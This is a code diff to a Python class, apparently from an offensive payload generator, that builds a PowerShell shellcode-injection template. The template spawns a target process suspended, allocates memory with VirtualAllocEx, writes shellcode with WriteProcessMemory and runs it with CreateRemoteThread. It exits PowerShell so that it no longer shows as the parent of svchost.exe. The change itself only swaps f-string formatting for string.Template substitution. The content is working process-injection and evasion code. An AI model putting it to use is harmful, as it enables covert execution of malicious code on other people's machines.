@@ -1,3 +1,5 @@
+from string import Template
+
 class spawnandinject:
     def __init__(self, arguments):
         self.memoryPermission = '0x20'
@@ -14,8 +16,8 @@ class spawnandinject:
     def compilerOptions(self) -> list[str]:
         return []
 
-    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
-        return f"""
+    def template(self) -> str:
+        return Template("""
 {imports}
         
 {codeblocks}
@@ -97,13 +99,13 @@ $CloseHandle = Get-Delegate $WaitForSingleObjectAddr @([IntPtr])
 $startupInformation = $startupInformationType.GetConstructors().Invoke($null)
 $processInformation = $processInformationType.GetConstructors().Invoke($null)
 
-$cmd = [System.Text.StringBuilder]::new("{self.target}")
+$cmd = [System.Text.StringBuilder]::new("$target")
 $result = $CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $false, 0x4, [IntPtr]::Zero, $null, $startupInformation, $processInformation))
 
 # Obtain the required handles from the PROCESS_INFORMATION structure
 $hProcess = $processInformation.hProcess
 
-$address = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $shellcode.Length, 0x3000, {self.memoryPermission})
+$address = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $shellcode.Length, 0x3000, $memoryPermission)
 $WriteProcessMemory.Invoke($hProcess, $address, $shellcode, $shellcode.Length, [IntPtr]::Zero)
 $thread = $CreateRemoteThread.Invoke($hProcess, 0, [IntPtr]::Zero, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero)
 $WaitForSingleObject.Invoke($thread, 500)
@@ -111,4 +113,4 @@ $CloseHandle.Invoke($thread)
 
 # Close powershell to remove it as the parent of svchost.exe
 exit
-"""
+""").safe_substitute(target=self.target, memoryPermission=self.memoryPermission)
